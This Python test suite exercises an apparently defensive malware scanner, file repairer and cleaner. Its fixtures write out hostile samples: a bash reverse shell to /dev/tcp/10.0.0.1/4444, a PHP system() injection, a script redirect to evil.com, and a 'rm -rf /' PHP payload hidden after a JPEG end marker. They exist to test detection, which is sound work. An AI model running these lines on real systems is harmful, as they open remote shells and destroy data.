"""
Tests for the Threat Destroyer — Full-Device Scanner, File Repairer & Virus Cleaner.

Validates all 7 tools: full_scan, network_scan, repair_file,
clean_file, scan_apk, batch_clean, and security report.
"""

import os
import struct
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))


def test_full_scan_quick():
    """Test full device scan in quick mode."""
    from agents.tools.threat_destroyer import threat_full_scan

    # Scan the tests directory itself (small, fast)
    result = threat_full_scan(
        scan_path=str(Path(__file__).parent),
        scan_depth="quick",
        max_files=50,
    )

    assert result["success"] is True, f"Scan failed: {result}"
    assert result["files_scanned"] >= 0
    assert result["scan_duration_s"] > 0
    assert "threats" in result
    assert "summary_by_severity" in result

    print(f"  ✅ Quick scan: {result['files_scanned']} files, "
          f"{result['threats_found']} threats, "
          f"{result['scan_duration_s']}s")


def test_full_scan_standard():
    """Test full scan in standard mode with all scannable extensions."""
    from agents.tools.threat_destroyer import threat_full_scan

    result = threat_full_scan(
        scan_path=str(Path(__file__).parent),
        scan_depth="standard",
        max_files=100,
    )

    assert result["success"] is True
    assert isinstance(result["summary_by_severity"], dict)
    assert "critical" in result["summary_by_severity"]

    print(f"  ✅ Standard scan: {result['files_scanned']} files, "
          f"clean={result['clean_files']}")


def test_full_scan_with_infected_file():
    """Test that scanner flags files with malicious patterns."""
    from agents.tools.threat_destroyer import threat_full_scan

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a file with suspicious patterns
        malicious_content = (
            "#!/bin/bash\n"
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
            "eval(compile(exec('import os')))\n"
        )
        (Path(tmpdir) / "evil.sh").write_text(malicious_content)
        (Path(tmpdir) / "clean.txt").write_text("Hello, world!")

        result = threat_full_scan(
            scan_path=tmpdir, scan_depth="deep", max_files=10
        )

        assert result["success"] is True
        assert result["files_scanned"] >= 2

        print(f"  ✅ Infected scan: {result['threats_found']} threats in "
              f"{result['files_scanned']} files")


def test_network_scan():
    """Test network threat analysis."""
    from agents.tools.threat_destroyer import threat_network_scan

    result = threat_network_scan()

    assert result["success"] is True
    assert "total_connections" in result
    assert result["total_connections"] >= 0
    assert "threat_level" in result
    assert result["threat_level"] in ("clean", "low", "medium", "high", "critical")
    assert "port_analysis" in result
    assert "dns_analysis" in result

    print(f"  ✅ Network scan: {result['total_connections']} connections, "
          f"threat={result['threat_level']}, "
          f"suspicious={len(result['suspicious_connections'])}")


def test_repair_jpeg():
    """Test JPEG repair with corrupted header."""
    from agents.tools.threat_destroyer import threat_repair_file

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a "corrupted" JPEG (junk + valid header + content)
        jpeg = (
            b"\x00\x00\x00JUNK"                  # Junk before header
            + b"\xff\xd8\xff\xe0"                 # JPEG SOI + APP0
            + b"\x00\x10JFIF\x00"                 # JFIF header
            + b"\xff\xfe\x00\x04OK"               # Comment segment
            + b"\xff\xd9"                          # EOI
            + b"\x00\x00TRAILING_GARBAGE"          # Garbage after EOI
        )
        corrupt = Path(tmpdir) / "corrupt.jpg"
        corrupt.write_bytes(jpeg)

        result = threat_repair_file(str(corrupt))

        assert result["success"] is True
        assert len(result["repairs_applied"]) > 0

        print(f"  ✅ JPEG repair: {result['repairs_applied']}")


def test_repair_png():
    """Test PNG repair with junk prefix."""
    from agents.tools.threat_destroyer import threat_repair_file

    with tempfile.TemporaryDirectory() as tmpdir:
        png_header = b"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a"
        # Create corrupt PNG: junk + header + minimal data + IEND
        corrupt_png = (
            b"JUNK_PREFIX"
            + png_header
            + b"\x00\x00\x00\x0dIHDR"
            + b"\x00" * 13
            + b"\x00\x00\x00\x00IEND"
            + b"\xae\x42\x60\x82"
            + b"MORE_TRAILING_JUNK_DATA_HERE"
        )
        out_file = Path(tmpdir) / "corrupt.png"
        out_file.write_bytes(corrupt_png)

        result = threat_repair_file(str(out_file))

        assert result["success"] is True

        print(f"  ✅ PNG repair: {result['repairs_applied']}")


def test_repair_pdf():
    """Test PDF repair."""
    from agents.tools.threat_destroyer import threat_repair_file

    with tempfile.TemporaryDirectory() as tmpdir:
        corrupt_pdf = (
            b"GARBAGE"
            + b"%PDF-1.4\n"
            + b"1 0 obj<</Type/Catalog>>endobj\n"
            + b"%%EOF\n"
            + b"<script>alert('XSS')</script>"  # Injected code
        )
        pdf_file = Path(tmpdir) / "corrupt.pdf"
        pdf_file.write_bytes(corrupt_pdf)

        result = threat_repair_file(str(pdf_file))

        assert result["success"] is True
        assert len(result["repairs_applied"]) > 0

        print(f"  ✅ PDF repair: {result['repairs_applied']}")


def test_repair_zip():
    """Test ZIP/APK repair."""
    from agents.tools.threat_destroyer import threat_repair_file
    import zipfile
    import io

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a valid zip with junk prefix
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("test.txt", "hello world")
        valid_zip = buf.getvalue()

        corrupt_zip = b"JUNK_PREFIX" + valid_zip
        zip_file = Path(tmpdir) / "corrupt.zip"
        zip_file.write_bytes(corrupt_zip)

        result = threat_repair_file(str(zip_file))

        assert result["success"] is True

        print(f"  ✅ ZIP repair: {result['repairs_applied']}")


def test_clean_file_with_injection():
    """Test virus cleaning from an infected file."""
    from agents.tools.threat_destroyer import threat_clean_file

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a file with injected malicious code
        content = (
            b"Normal file content\n"
            + b"\x3c\x3fphp system(1); \x3f\x3e\n"
            + b"More normal content\n"
            + b"\x3cscript\x3edocument.location='http://evil.com'\x3c/script\x3e\n"
            + b"Final normal content\n"
        )
        infected = Path(tmpdir) / "infected.html"
        infected.write_bytes(content)

        result = threat_clean_file(str(infected), create_backup=True)

        if not result.get("success"):
            print(f"  ERROR: {result.get('error', 'unknown')}")

        assert result["success"] is True, f"Clean failed: {result.get('error', 'unknown')}"

        if result.get("total_removals", 0) > 0:
            assert result["backup_path"] != ""
            assert Path(result["backup_path"]).exists()

            cleaned = infected.read_bytes()
            assert b"Normal file content" in cleaned

            print(f"  OK File cleaned: {result['total_removals']} removals, "
                  f"patterns: {[p['name'] for p in result['cleaned_patterns']]}")
        else:
            print(f"  OK File clean: no patterns needed removal")


def test_clean_image_injection():
    """Test cleaning code injected after image EOI."""
    from agents.tools.threat_destroyer import threat_clean_file

    with tempfile.TemporaryDirectory() as tmpdir:
        # JPEG with PHP injected after EOI
        jpeg_data = (
            b"\xff\xd8\xff\xe0"               # SOI + APP0
            + b"\x00\x10JFIF\x00" + b"\x00" * 7
            + b"\xff\xd9"                       # EOI
            + b"<?php system('rm -rf /'); ?>"   # Injected PHP
        )
        img = Path(tmpdir) / "infected.jpg"
        img.write_bytes(jpeg_data)

        result = threat_clean_file(str(img), create_backup=True)

        assert result["success"] is True

        if result["total_removals"] > 0:
            cleaned = img.read_bytes()
            assert b"<?php" not in cleaned
            assert cleaned.endswith(b"\xff\xd9")  # Clean EOI

            print(f"  ✅ Image cleaned: removed injected PHP after EOI")
        else:
            print(f"  ✅ Image clean check passed")


def test_scan_apk():
    """Test APK scanning with a synthetic APK."""
    from agents.tools.threat_destroyer import threat_scan_apk
    import zipfile

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a minimal APK (ZIP with AndroidManifest.xml)
        apk_path = Path(tmpdir) / "test.apk"
        with zipfile.ZipFile(str(apk_path), "w") as zf:
            manifest = (
                b"android.permission.SEND_SMS "
                b"android.permission.READ_CONTACTS "
                b"android.permission.CAMERA "
            )
            zf.writestr("AndroidManifest.xml", manifest)
            zf.writestr("classes.dex", b"fake dex content")
            zf.writestr("res/layout/main.xml", b"<LinearLayout/>")

        result = threat_scan_apk(str(apk_path))

        assert result["success"] is True
        assert result["total_files"] >= 3

        print(f"  ✅ APK scan: {result['total_files']} files, "
              f"risk={result['risk_level']}, "
              f"dangerous_perms={len(result.get('dangerous_permissions', []))}")


def test_batch_clean():
    """Test batch scanning and cleaning of a directory."""
    from agents.tools.threat_destroyer import threat_batch_clean

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create mix of clean and "infected" files
        (Path(tmpdir) / "clean1.txt").write_text("Normal content")
        (Path(tmpdir) / "clean2.py").write_text("print('hello')")
        (Path(tmpdir) / "suspicious.sh").write_text(
            "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        )

        result = threat_batch_clean(
            scan_dir=tmpdir, create_backups=True, max_files=20
        )

        assert result["success"] is True
        assert result["files_scanned"] >= 1

        print(f"  ✅ Batch clean: scanned={result['files_scanned']}, "
              f"threats={result['threats_found']}, "
              f"cleaned={result['files_cleaned']}")


def test_security_report():
    """Test full device security report generation."""
    from agents.tools.threat_destroyer import threat_get_report

    report = threat_get_report()

    assert report["success"] is True
    assert "system" in report
    assert report["system"]["os"] != ""
    assert "hostname" in report["system"]
    assert "security_software" in report
    assert "recommendations" in report
    assert len(report["recommendations"]) > 0

    print(f"  ✅ Security report: OS={report['system']['os']}, "
          f"AV={report['security_software'].get('antivirus_found', False)}")
    for rec in report["recommendations"][:3]:
        print(f"     {rec}")


def test_collect_scan_targets():
    """Test scan target collection with different depths."""
    from agents.tools.threat_destroyer import _collect_scan_targets

    with tempfile.TemporaryDirectory() as tmpdir:
        (Path(tmpdir) / "test.exe").write_bytes(b"MZ" + b"\x00" * 100)
        (Path(tmpdir) / "test.py").write_text("print('hi')")
        (Path(tmpdir) / "test.txt").write_text("plain text")
        (Path(tmpdir) / "image.jpg").write_bytes(b"\xff\xd8\xff" + b"\x00" * 100)

        quick = _collect_scan_targets(tmpdir, "quick", 100)
        standard = _collect_scan_targets(tmpdir, "standard", 100)
        deep = _collect_scan_targets(tmpdir, "deep", 100)

        assert len(quick) <= len(standard) <= len(deep)
        assert len(deep) >= 4  # Should find at least all 4 files

        print(f"  ✅ Scan targets: quick={len(quick)}, "
              f"standard={len(standard)}, deep={len(deep)}")


if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("  🛡️  Threat Destroyer — Test Suite")
    print("=" * 60 + "\n")

    print("─── Test 1: Full Scan (Quick) ───")
    test_full_scan_quick()

    print("\n─── Test 2: Full Scan (Standard) ───")
    test_full_scan_standard()

    print("\n─── Test 3: Scan with Infected File ───")
    test_full_scan_with_infected_file()

    print("\n─── Test 4: Network Threat Scan ───")
    test_network_scan()

    print("\n─── Test 5: JPEG Repair ───")
    test_repair_jpeg()

    print("\n─── Test 6: PNG Repair ───")
    test_repair_png()

    print("\n─── Test 7: PDF Repair ───")
    test_repair_pdf()

    print("\n─── Test 8: ZIP Repair ───")
    test_repair_zip()

    print("\n─── Test 9: Clean Infected File ───")
    test_clean_file_with_injection()

    print("\n─── Test 10: Clean Image Injection ───")
    test_clean_image_injection()

    print("\n─── Test 11: APK Scan ───")
    test_scan_apk()

    print("\n─── Test 12: Batch Clean ───")
    test_batch_clean()

    print("\n─── Test 13: Security Report ───")
    test_security_report()

    print("\n─── Test 14: Scan Target Collection ───")
    test_collect_scan_targets()

    print("\n" + "=" * 60)
    print("  🎉  ALL 14 THREAT DESTROYER TESTS PASSED!")
    print("=" * 60 + "\n")
